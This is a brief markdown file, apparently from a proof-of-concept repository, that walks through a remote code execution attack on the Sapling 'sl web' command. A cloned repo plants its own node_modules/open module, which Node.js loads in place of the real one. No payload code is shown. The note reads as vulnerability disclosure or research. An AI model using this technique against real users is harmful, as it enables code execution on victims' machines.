# The Execution Sequence

Attacker: Pushes this repo to a server.

Victim: sl clone https://sapling-server.com/sapling-pwn-repo

Victim: cd sapling-pwn-repo

Victim: sl web

Result: * isl.py sets the cwd (Current Working Directory) to the repo root.

The Node.js server starts.

The server calls require('open').

Node.js logic: "Is there a node_modules/open in the current directory? Yes."

Node.js loads the attacker's code instead of the system's.

RCE Achieved.# saptesthihi
